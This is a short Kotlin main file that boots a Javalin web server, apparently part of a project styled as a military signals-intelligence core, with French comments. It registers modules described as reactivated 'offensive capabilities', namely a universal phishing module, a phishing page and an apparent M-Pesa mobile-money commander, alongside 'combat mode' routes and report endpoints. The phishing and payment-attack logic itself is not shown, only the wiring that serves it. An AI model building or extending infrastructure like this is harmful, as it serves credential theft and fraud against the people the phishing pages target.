package com.fardc.sigint.core

import io.javalin.Javalin
import java.time.Instant

fun main(args: Array<String>) {
    println("✅ SOVEREIGN CORE v2.4.0 (COMBAT-READY) boot OK")
    
    // 1. Initialisation du Noyau (Core)
    val vault = SecurityVault() 
    val reporter = MissionReporter(vault)
    val combatHandler = CombatModeHandler() // Nouveau cerveau tactique
    
    // 2. Initialisation du Serveur
    val app = Javalin.create { config ->
        config.showJavalinBanner = false
    }.start(7070)

    // 3. Réactivation des Capacités Offensives (SIGINT)
    // On passe le 'vault' ou le 'combatHandler' selon les besoins des modules
    UniversalPhish(vault).setup(app)
    MPesaCommander(vault).setup(app) // Réactivé
    PhishCommander(vault).setupPhishPage(app) // Réactivé
    
    // 4. Activation du Centre de Commandement Tactique
    combatHandler.setupRoutes(app)

    // 5. Endpoints de Gestion et Reporting
    app.get("/admin/report") { ctx ->
        val currentMode = combatHandler.getStatus()
        println("📝 [TRIGGER] Génération rapport en mode: $currentMode")
        reporter.generateDailyReport()
        ctx.result("📊 RAPPORT GÉNÉRÉ - ÉTAT TACTIQUE: $currentMode")
    }

    app.get("/status") { ctx -> 
        val statusInfo = """
            SYSTEM: ONLINE
            MODE: ${combatHandler.getStatus()}
            TIMESTAMP: ${Instant.now()}
        """.trimIndent()
        ctx.result(statusInfo)
    }
}
